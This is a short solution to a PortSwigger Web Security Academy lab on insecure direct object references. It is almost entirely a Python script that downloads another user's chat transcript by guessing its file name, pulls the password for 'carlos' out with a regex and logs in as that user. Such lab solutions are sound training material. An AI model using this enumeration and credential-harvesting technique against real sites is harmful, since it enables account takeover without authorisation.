# Insecure direct object references
> This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.
> Solve the lab by finding the password for the user `carlos`, and logging into their account.

```python
import requests
import re
import sys
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0a9a004b038db3d18171cf2f006a00e5.web-security-academy.net"

def exploit_idor_login(url):
    session = requests.Session()
    
    # 1. Exploitation Phase: IDOR
    # The vulnerability allows accessing other transcripts by guessing the ID (1.txt)
    # Ensure no double slashes in URL construction
    transcript_url = f"{url.rstrip('/')}/download-transcript/1.txt"
    print(f"[*] Attempting IDOR on: {transcript_url}")
    
    try:
        response = session.get(transcript_url)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[-] Failed to fetch transcript: {e}")
        return

    # 2. Extraction Phase: Regex
    # Pattern matches "password is " followed by the password word
    match = re.search(r"password is (\w+)", response.text)
    
    if not match:
        print("[-] Password pattern not found in transcript.")
        return

    carlos_password = match.group(1).strip()
    print(f"[+] Found Password: {carlos_password}")

    # 3. Access Phase: Login
    login_url = f"{url.rstrip('/')}/login"
    print(f"[*] Attempting login as 'carlos'...")
    
    # Fetch CSRF token first
    login_page = session.get(login_url)
    soup = BeautifulSoup(login_page.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    credentials = {
        "username": "carlos",
        "password": carlos_password,
        "csrf": csrf_token
    }
    
    # Perform login
    login_response = session.post(login_url, data=credentials)
    
    # Verify success
    if "Log out" in login_response.text:
        print("[+] LOGIN SUCCESSFUL AS CARLOS")
    else:
        print("[-] Login failed.")

if __name__ == "__main__":
    exploit_idor_login(BASE_URL)
```